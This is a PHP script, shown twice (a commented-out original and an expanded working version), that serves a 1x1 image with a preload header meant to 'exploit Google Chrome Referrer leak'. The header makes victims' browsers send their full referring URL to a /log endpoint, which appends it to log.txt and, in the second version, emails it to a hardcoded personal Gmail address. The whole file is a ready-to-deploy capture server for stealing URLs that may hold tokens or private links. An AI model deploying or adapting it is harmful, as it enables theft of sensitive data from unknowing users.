// <?php
// //Get the endpoint being requsted
// $page = explode("?",$_SERVER["REQUEST_URI"])[0];
// if( $page === '/img.png' ){
//   header("Content-Type: image/png");
//   //Add the below header to exploit Google Chrome Referrer leak
//   header('Link: </log>;rel="preload"; as="image"; referrerpolicy="unsafe-url"');
//   //Return a 1x1 png file
//   echo base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAApJREFUCNdjYAAAAAIAAeIhvDMAAAAASUVORK5CYII=");
//   exit();
// }elseif( $page === '/log' ){
//   //save the Referrer to log.txt
//   file_put_contents('log.txt', $_SERVER["HTTP_REFERER"]."\n" , FILE_APPEND  );
//   echo "OK"; 
// }else{
//   echo "Page Not Found";
// }

<?php
// Get the endpoint being requested
$page = explode("?", $_SERVER["REQUEST_URI"])[0];

if ($page === '/img.png') {
    header("Content-Type: image/png");
    // Preload /log with full Referer
    header('Link: </log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"');
    echo base64_decode(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAApJREFUCNdjYAAAAAIAAeIhvDMAAAAASUVORK5CYII="
    );
    exit();

} elseif ($page === '/log') {
    // 1) Append to log file
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No-Referer';
    file_put_contents('log.txt', $referer . "\n", FILE_APPEND);

    // 2) Send an email notification
    $to      = 'chhayneeseak77@gmail.com';        // ← your address
    $subject = 'New Referrer Logged';
    $message = "A new referer was recorded:\r\n" . $referer;
    // Wrap long lines per PHP recommendations
    $message = wordwrap($message, 70);

    // Basic headers
    $headers = [];
    $headers[] = 'From: logger@yourdomain.com';   // ← adjust sender if needed
    $headers[] = 'Reply-To: logger@yourdomain.com';
    $headers[] = 'X-Mailer: PHP/' . phpversion();

    // Send the mail
    if (!mail($to, $subject, $message, implode("\r\n", $headers))) {
        error_log("Failed to send log email for referer: $referer");
    }

    echo "OK";
    exit();

} else {
    echo "Page Not Found";
}
?>
